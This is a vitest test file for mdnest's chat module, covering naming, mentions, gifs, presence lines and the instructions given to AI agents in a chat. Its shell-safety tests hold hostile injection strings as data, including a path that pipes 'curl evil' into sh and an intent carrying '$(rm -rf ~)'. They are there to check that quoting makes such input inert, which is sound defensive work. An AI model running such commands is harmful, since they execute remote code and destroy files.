import { describe, it, expect } from 'vitest';
import {
  slugify, chatPathFor, colorForAuthor, AUTHOR_COLORS, isOwnMessage,
  groupMessages, mergeMessages, agentInstructions, workingLine, contextLabel, contextTitle, plainPreview, shellQuote, isChatDoc,
  mentionsName, highlightMentions, participants, mentionQuery, completeMention,
  avatarFor, reactions, gifMarkdown, expandGifRefs, initialOf, roleFor,
} from '../chat.js';

describe('chat naming', () => {
  it('slugifies a channel name into a shell-safe filename', () => {
    expect(slugify('Release Coordination — Q4!')).toBe('release-coordination-q4');
    expect(slugify('Café déjà vu')).toBe('cafe-deja-vu');
    expect(slugify('   ')).toBe('chat');
  });
  it('puts a new chat in the folder it was given', () => {
    expect(chatPathFor('Team Sync')).toBe('Chats/team-sync.md');
    expect(chatPathFor('Team Sync', '/ops/rooms/')).toBe('ops/rooms/team-sync.md');
    expect(chatPathFor('Team Sync', '')).toBe('team-sync.md');
  });
});

describe('author colours', () => {
  it('is stable per name and always a theme token', () => {
    expect(colorForAuthor('claude-api')).toBe(colorForAuthor('claude-api'));
    for (const n of ['a', 'bob', 'claude-api', '']) expect(AUTHOR_COLORS).toContain(colorForAuthor(n));
  });
});

describe('own messages', () => {
  it('is mine only under my current posting name', () => {
    // multi mode, posting as my account
    expect(isOwnMessage({ author: 'ahsan' }, 'ahsan', 'ahsan')).toBe(true);
    // multi mode, posting under a label
    expect(isOwnMessage({ author: 'pm', via: 'ahsan' }, 'ahsan', 'pm')).toBe(true);
    // an agent on my token is not me
    expect(isOwnMessage({ author: 'claude-a', via: 'ahsan' }, 'ahsan', 'ahsan')).toBe(false);
    // single mode: no account, no via
    expect(isOwnMessage({ author: 'admin' }, null, 'admin')).toBe(true);
    expect(isOwnMessage({ author: 'claude-a' }, null, 'admin')).toBe(false);
    expect(isOwnMessage({ author: 'bob' }, 'ahsan', 'ahsan')).toBe(false);
  });
});

describe('grouping', () => {
  it('starts a new group on a new author or a long gap', () => {
    const g = groupMessages([
      { n: 1, author: 'a', time: '2026-10-02T10:00:00Z' },
      { n: 2, author: 'a', time: '2026-10-02T10:01:00Z' },
      { n: 3, author: 'b', time: '2026-10-02T10:02:00Z' },
      { n: 4, author: 'b', time: '2026-10-02T11:00:00Z' },
    ]);
    expect(g.map((m) => m.startsGroup)).toEqual([true, false, true, true]);
  });
});

describe('merging polled messages', () => {
  it('never duplicates a message the poll and the send both delivered', () => {
    const cur = [{ n: 1 }, { n: 2 }];
    expect(mergeMessages(cur, [{ n: 2 }, { n: 3 }]).map((m) => m.n)).toEqual([1, 2, 3]);
    expect(mergeMessages(cur, [])).toBe(cur);
  });
});

describe('agent instructions', () => {
  it('are pasteable — no <angle-bracket> placeholders', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
    expect(s).not.toMatch(/[<>]/);
    expect(s).toContain('mdnest chat wait @mini/notes/Chats/team.md --as codxu --timeout 120');
    // the old snippet's literal name is what agents posted as; it must be gone
    expect(s).not.toContain('my-agent');
    expect(s).not.toContain('--after');
    // it reads the conversation ONCE before speaking (that saves its place),
    // then only waits for what is new; a full re-read is a last resort that
    // does not move its place
    expect(s).toContain('1. Read the chat once: mdnest chat read @mini/notes/Chats/team.md --as codxu');
    expect(s).toMatch(/never read the whole chat again/);
    expect(s).toContain('mdnest chat read @mini/notes/Chats/team.md shows it all (no --as');
  });
});

describe('agent intent', () => {
  it('puts what the agent is for into the prompt, right after its name', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu', 'Review the API PRs.\nFlag anything touching auth.');
    const lines = s.split('\n');
    expect(lines[0]).toMatch(/^You are codxu in an mdnest chat/);
    expect(lines.slice(2, 5)).toEqual(['Your job in this chat:', '  Review the API PRs.', '  Flag anything touching auth.']);
  });
  it('tells the agent the job is saved as its role and repeated while it waits', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu', 'Review the API PRs.');
    expect(s).toContain('saved with the chat as your role, and wait repeats it after new messages');
    // /role goes through an ordinary post, so every CLI version can save one.
    expect(s).toContain('mdnest chat post @mini/notes/Chats/team.md "/role what you do here" --as codxu');
  });
  it('finds a saved role the way mentions match names', () => {
    expect(roleFor({ Codxu: 'Review PRs' }, 'codxu')).toBe('Review PRs');
    expect(roleFor({ codxu: 'Review PRs' }, 'qa-1')).toBe('');
    expect(roleFor(undefined, 'codxu')).toBe('');
  });
  it('adds nothing when the intent is empty or blank', () => {
    const plain = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
    expect(agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu', '   ')).toBe(plain);
    expect(plain).not.toContain('Your job');
  });
  it('never puts the intent into a shell command', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu', "$(rm -rf ~); 'x'");
    const cmds = s.split('\n').filter((l) => l.includes('mdnest chat '));
    expect(cmds.length).toBeGreaterThan(3);
    for (const c of cmds) expect(c).not.toContain('rm -rf');
  });
});

describe('list preview', () => {
  it('shows text, not markdown markers', () => {
    expect(plainPreview('Thanks. **Shipping** at 5pm — `release/v4.6.0`.')).toBe('Thanks. Shipping at 5pm — release/v4.6.0.');
    expect(plainPreview('see [the doc](x.md)\n\n```js\nx()\n```')).toBe('see the doc [code]');
  });
});

describe('shell safety of the agent snippet', () => {
  it('quotes a hostile chat path into one inert word', () => {
    const s = agentInstructions('', 'notes', "x;curl evil|sh;it's.md");
    expect(s).toContain(`mdnest chat read 'notes/x;curl evil|sh;it'\\''s.md' --as AGENT_NAME`);
  });
  it('leaves an ordinary path readable', () => {
    expect(shellQuote('@mini/notes/Chats/team-sync.md')).toBe('@mini/notes/Chats/team-sync.md');
    expect(shellQuote('notes/Chats/q4 plan.md')).toBe("'notes/Chats/q4 plan.md'");
  });
  it('round-trips through a real shell', async () => {
    const { execFileSync } = await import('node:child_process');
    const hostile = "a;echo PWNED|cat;$(id)`id`'b.md";
    const out = execFileSync('sh', ['-c', `printf %s ${shellQuote(hostile)}`]).toString();
    expect(out).toBe(hostile);
  });
});

describe('isChatDoc (the editor lock and the tree redirect depend on it)', () => {
  it('matches the backend: leading frontmatter with mdnest-chat: true', () => {
    expect(isChatDoc('---\nmdnest-chat: true\ntitle: T\n---\n\nhi')).toBe(true);
    expect(isChatDoc('\uFEFF---\r\ntitle: T\r\nmdnest-chat: "true"\r\n---\r\n')).toBe(true);
  });
  it('does not match a note the Live editor already flattened', () => {
    // exactly what Live turned a chat into before chat notes were locked
    expect(isChatDoc('***\n\nmdnest-chat: true\ntitle: myCustomChat\n-------------------\n')).toBe(false);
    expect(isChatDoc('---\nmdnest-chat: false\n---\n')).toBe(false);
    expect(isChatDoc('# mdnest-chat: true')).toBe(false);
  });
});

describe('@mentions', () => {
  it('matches the backend grammar', () => {
    expect(mentionsName('@codxu take the frontend', 'codxu')).toBe(true);
    expect(mentionsName('thanks @CodXu.', 'codxu')).toBe(true);
    expect(mentionsName('@all standup', 'codxu')).toBe(true);
    expect(mentionsName('@codu only', 'codxu')).toBe(false);
    expect(mentionsName('mail x@codxu.com', 'codxu')).toBe(false);
    expect(mentionsName('@codxu-bot', 'codxu')).toBe(false);
  });
  it('highlights mentions but leaves code alone', () => {
    const h = highlightMentions('hi @codu, see `@notme` and\n```\n@neither\n```\nok @codxu.');
    expect(h).toContain('<span class="chat-mention" data-mention="codu">@codu</span>,');
    expect(h).toContain('<span class="chat-mention" data-mention="codxu">@codxu</span>.');
    expect(h).toContain('`@notme`');
    expect(h).toContain('@neither');
    expect(h.match(/chat-mention/g)).toHaveLength(2);
  });
  it('offers participants most recent first and completes the word at the caret', () => {
    expect(participants([{ n: 1, author: 'a' }, { n: 2, author: 'b' }, { n: 3, author: 'a' }])).toEqual(['a', 'b']);
    expect(mentionQuery('hey @co', 7)).toBe('co');
    expect(mentionQuery('mail x@co', 9)).toBe(null);
    expect(mentionQuery('no mention', 10)).toBe(null);
    expect(completeMention('hey @co and', 7, 'codxu')).toEqual({ text: 'hey @codxu  and', caret: 11 });
  });
});

describe('chat images', () => {
  const gifs = [
    { name: 'avatar-codxu', path: 'ChatGifs/avatar-codxu.svg', avatar: 'codxu' },
    { name: 'nod', path: 'ChatGifs/nod.svg' },
  ];
  it('finds a poster avatar case-insensitively and keeps avatars out of reactions', () => {
    expect(avatarFor(gifs, 'CodXu').path).toBe('ChatGifs/avatar-codxu.svg');
    expect(avatarFor(gifs, 'codu')).toBe(null);
    expect(reactions(gifs).map((g) => g.name)).toEqual(['nod']);
    expect(gifMarkdown(gifs[1])).toBe('![nod](gif:nod)');
  });
  it('the agent prompt explains avatars and reactions, still with no angle brackets', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
    expect(s).not.toMatch(/[<>]/);
    expect(s).toContain('mdnest chat gifs @mini/notes');
    // the avatar is a numbered step, one command; "optional" got skipped
    expect(s).toMatch(/2\. Pick a thumbnail nobody here uses/);
    // auto: a built-in nobody in the chat already wears
    expect(s).toContain('mdnest chat avatar @mini/notes --as codxu --pick auto');
    expect(s).not.toMatch(/optional/i);
    expect(s).toContain('![nod](gif:nod)');
  });
  it('the prompt covers the working status, the human question, and several agents', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
    // A /status post works with every CLI version (the server handles it).
    expect(s).toContain('mdnest chat post @mini/notes/Chats/team.md "/status what you are doing" --as codxu');
    expect(s).not.toContain('mdnest chat status');
    // How the agent tells the keepalive hook it is done.
    expect(s).toContain('mdnest chat leave @mini/notes/Chats/team.md --as codxu');
    expect(s).toContain('![waiting](gif:question)');
    expect(s).toMatch(/Do not repeat what someone already said/);
    expect(s).toMatch(/Emoji are fine/);
    // concise: the whole prompt stays short enough to read at a glance
    // (31 since the /role line, which keeps an agent on its job)
    expect(s.split('\n').length).toBeLessThanOrEqual(31);
  });
});

describe('gif: references', () => {
  const gifs = [
    { name: 'nod', path: 'ChatGifs/nod.svg', scope: 'workspace' },
    { name: 'done', path: '/api/chat/gifs/builtin/done.svg', scope: 'builtin' },
  ];
  const urlFor = (g) => (g.scope === 'builtin' ? g.path : `/api/files/ns/${g.path}`);
  it('resolves by name (the server list already applies workspace-over-builtin)', () => {
    expect(expandGifRefs('ok ![nod](gif:nod) and ![x](gif:DONE)', gifs, urlFor))
      .toBe('ok ![nod](/api/files/ns/ChatGifs/nod.svg) and ![x](/api/chat/gifs/builtin/done.svg)');
  });
  it('an unknown name reads as text, not a broken image', () => {
    expect(expandGifRefs('![x](gif:nope)', gifs, urlFor)).toBe('`:nope:`');
  });
  it('leaves ordinary images and links alone', () => {
    expect(expandGifRefs('![a](ChatGifs/a.svg) [gif:link](x)', gifs, urlFor)).toBe('![a](ChatGifs/a.svg) [gif:link](x)');
  });
});

describe('thumbnails', () => {
  it('keeps built-in avatar choices out of the reaction picker', () => {
    const gifs = [{ name: 'owl', kind: 'avatar-choice' }, { name: 'nod' }, { name: 'avatar-x', avatar: 'x' }];
    expect(reactions(gifs).map((g) => g.name)).toEqual(['nod']);
  });
  it('falls back to an initial for anyone without an avatar', () => {
    expect(initialOf('Batooli')).toBe('B');
    expect(initialOf('_codu')).toBe('C');
    expect(initialOf('')).toBe('?');
  });
});

describe('working line', () => {
  const now = Date.parse('2026-10-06T10:05:30Z');
  const w = (author, kind, since, extra = {}) => ({ author, kind, since, ...extra });
  it('a /status reads as working on something, with minutes once it runs long', () => {
    const line = workingLine([w('codxu', 'working', '2026-10-06T10:02:00Z', { text: 'reviewing the PR' })], 'ahsan', 'ahsan', now);
    expect(line.text).toBe('codxu is working: reviewing the PR · 3 min');
    expect(line.busy).toBe(true);
  });
  it('an agent that just got new messages is thinking', () => {
    expect(workingLine([w('codxu', 'thinking', '2026-10-06T10:05:00Z')], 'ahsan', 'ahsan', now).text).toBe('codxu is thinking');
  });
  it('waiting agents are named together, after the busy ones', () => {
    const line = workingLine([
      w('qa-1', 'listening', '2026-10-06T10:05:20Z'),
      w('codxu', 'thinking', '2026-10-06T10:05:00Z'),
      w('lead-qa', 'listening', '2026-10-06T10:05:20Z'),
    ], 'ahsan', 'ahsan', now);
    expect(line.text).toBe('codxu is thinking  ·  qa-1 and lead-qa are waiting');
    expect(line.title.split('\n')).toEqual(['codxu is thinking', 'qa-1 is waiting', 'lead-qa is waiting']);
  });
  it('one waiting agent alone; three get a comma list', () => {
    expect(workingLine([w('codxu', 'listening', '2026-10-06T10:05:20Z')], 'ahsan', 'ahsan', now).text).toBe('codxu is waiting');
    expect(workingLine(['a', 'b', 'c'].map((n) => w(n, 'listening', '2026-10-06T10:05:20Z')), 'me', 'me', now).text).toBe('a, b and c are waiting');
  });
  // The reported bug: three idle bots read "is working: undefined". Only an
  // entry with status text is working; anything else, including a kind this
  // page does not know, is waiting.
  it('never says working without saying on what', () => {
    const line = workingLine([
      w('AhsanSideKick', 'listening', '2026-10-06T10:05:20Z'),
      w('MaintContextAgent', 'idle', '2026-10-06T10:05:20Z'),
      w('codxuVerifier', undefined, '2026-10-06T10:05:20Z'),
      w('qa-1', 'working', '2026-10-06T10:05:20Z'),
    ], 'ahsan', 'ahsan', now);
    expect(line.text).toBe('AhsanSideKick, MaintContextAgent, codxuVerifier and qa-1 are waiting');
    expect(line.text).not.toMatch(/working|undefined/);
    expect(line.busy).toBe(false);
  });
  it('the prompt tells agents to say working only while working', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
    expect(s).toMatch(/show as waiting while you wait/);
    expect(s).toMatch(/going back to wait, clears it/);
    expect(s).not.toMatch(/listening/);
  });
  it('leaves out your own presence and is null when nobody else is here', () => {
    expect(workingLine([w('ahsan', 'listening', '2026-10-06T10:05:00Z')], 'ahsan', 'ahsan', now)).toBeNull();
    expect(workingLine([], 'ahsan', 'ahsan', now)).toBeNull();
    expect(workingLine(undefined, 'ahsan', 'ahsan', now)).toBeNull();
  });
  it('an agent on my token under its own name is someone else, not me', () => {
    const line = workingLine([w('claude-a', 'thinking', '2026-10-06T10:05:00Z', { via: 'ahsan' })], 'ahsan', 'ahsan', now);
    expect(line.text).toContain('claude-a is thinking');
  });
});

describe('context size', () => {
  const now = Date.parse('2026-10-06T10:05:30Z');
  it('the chip is the percentage, or the token count when that is all we have', () => {
    expect(contextLabel({ used: 87000, total: 200000, pct: 44 })).toBe('44%');
    expect(contextLabel({ pct: 42 })).toBe('42%');
    expect(contextLabel({ used: 1200000, pct: -1 })).toBe('1.2M');
    expect(contextLabel(undefined)).toBe('');
  });
  it('the tooltip says how much and how long ago', () => {
    expect(contextTitle({ used: 87000, total: 200000, pct: 44, at: '2026-10-06T10:02:00Z' }, now))
      .toBe('Context used: 87k of 200k tokens, reported 3 min ago');
    expect(contextTitle({ pct: 42, at: '2026-10-06T10:05:20Z' }, now)).toBe('Context used: 42%, reported just now');
  });
  it('the presence line carries it by the name', () => {
    const line = workingLine([
      { author: 'codxu', kind: 'listening', since: '2026-10-06T10:05:20Z', context: { pct: 44 } },
      { author: 'qa-1', kind: 'thinking', since: '2026-10-06T10:05:20Z', context: { pct: 91 } },
    ], 'ahsan', 'ahsan', now);
    expect(line.text).toBe('qa-1 (91%) is thinking  ·  codxu (44%) is waiting');
  });
  it('the prompt tells agents to report it', () => {
    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
    expect(s).toContain('mdnest chat post @mini/notes/Chats/team.md "/context 42%" --as codxu');
  });
});
